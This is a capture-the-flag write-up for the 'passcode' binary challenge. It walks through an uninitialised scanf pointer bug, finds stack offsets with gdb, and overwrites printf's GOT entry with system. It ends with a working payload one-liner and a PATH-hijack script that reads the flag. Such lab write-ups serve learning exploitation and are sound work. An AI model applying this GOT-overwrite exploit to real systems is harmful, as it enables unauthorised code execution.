# Passcode

In the `welcome` function there's a `scanf` for a name, which is padded to 100 bytes:

```c
void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}
```

The program then asks for two passwords at `login`:

```c
int passcode1;
int passcode2;

printf("enter passcode1 : ");
scanf("%d", passcode1);
fflush(stdin);

// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
printf("enter passcode2 : ");
scanf("%d", passcode2);
```

There's a mistake there: scanf expects the address to which it should write the input, not the value. Thus it's going to write to whatever address is in the values of `passcode1` and `passcode2`.

They are then checked. If `passcode1 == 338150` and `passcode2 == 13371337`, we gain the shell.

This seems a bit too much in the beginning.

Let's check where in the stack are `name`, `passcode1` and `passcode2` being written. Perhaps we can fill in the passwords' initial values writing to the `name` buffer.

```bash
$ gdb passcode
>>> disas welcome
[...]
0x0804862f <+38>:	lea    edx,[ebp-0x70]
0x08048632 <+41>:	mov    DWORD PTR [esp+0x4],edx
0x08048636 <+45>:	mov    DWORD PTR [esp],eax
0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
[...]
>>> disas login
[...]
0x0804857c login+24 mov    edx,DWORD PTR [ebp-0x10]
0x0804857f login+27 mov    DWORD PTR [esp+0x4],edx
0x08048583 login+31 mov    DWORD PTR [esp],eax
0x08048586 login+34 call   0x80484a0 <__isoc99_scanf@plt>
[...]
0x080485aa login+70 mov    edx,DWORD PTR [ebp-0xc]
0x080485ad login+73 mov    DWORD PTR [esp+0x4],edx
0x080485b1 login+77 mov    DWORD PTR [esp],eax
0x080485b4 login+80 call   0x80484a0 <__isoc99_scanf@plt>
>>> b *0x08048639
>>> b *0x08048586
>>> b *0x080485b4
>>> r
Breakpoint 1, 0x08048639 in welcome ()
>>> p $ebp-0x70
$1 = (void *) 0xffffcc58 # name
>>> c
enter your name : AAAA
Welcome AAAA!
Breakpoint 2, 0x08048586 in login ()
>>> p $ebp-0x10
$2 = (void *) 0xffffccb8 # passcode1
>>> c
enter passcode1 : A
Breakpoint 3, 0x080485b4 in login ()
>>> p $ebp-0xc
$3 = (void *) 0xffffccbc # passcode2
```

Once we hit the first breakpoint, just inspect $rbp-0x70. The same for `passcode1` and `passcode2`

If we subtract `name` from `passcode1` (0xffffccb8 - 0xffffcc58), we get 0x60 (96), thus the last 4 bytes of `name` are written to the initial value of passcode1.

This means we have an *arbitrary write*, because the scanf later on writes to the address in `passcode1`, which we can control. But what now? We need to write *two* passwords, not one.

If we write the address of `passcode2` into `passcode1`, we only control `passcode2`. What about `passcode1`?

But if we have an aribtrary write, we can also write to the `Global Offset Table`, redirecting the execution of any libc function in the program. Perhaps we can overwrite the `printf` entry, making it point to `system` instead. Where is it located?

```bash
$ objdump -s passcode
[...]
Contents of section .got.plt:
 8049ff4 289f0408 00000000 00000000 26840408  (...........&...
 804a004 36840408 46840408 56840408 66840408  6...F...V...f...
 804a014 76840408 86840408 96840408 a6840408  v...............
$ gdb passcode
>>> x 0x804a000
0x804a000 <printf@got.plt>: 0x08048426
>>> x 0x804a010
0x804a010 <system@got.plt>: 0x08048466
```

This means we have to write `0x08048466` into `0x804a000`.

The `passcode1` scanf expects a decimal number, so we provide `134513766` (0x08048466).

```bash
$ (python -c "print('a'*96+'\x00\xa0\x04\x08')"; sleep 1; printf "134513766") | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
sh: enter: command not found
enter passcode1 : checking...
Login Failed!
```

This is exactly what we wanted: `prinf` became `system`, although it returned an error because there's no `enter` comand, from the string `enter passcode2 : `.

Now we can write the enter command ourselves, reading the flag:

```bash
$ mkdir /tmp/pc
$ echo "/bin/cat flag" > /tmp/pc/enter
$ chmod +x /tmp/pc/enter
$ export PATH=/tmp/pc:$PATH
$ (python -c "print('a'*96+'\x00\xa0\x04\x08')"; sleep 1; printf "134513766") | ./passcode
```
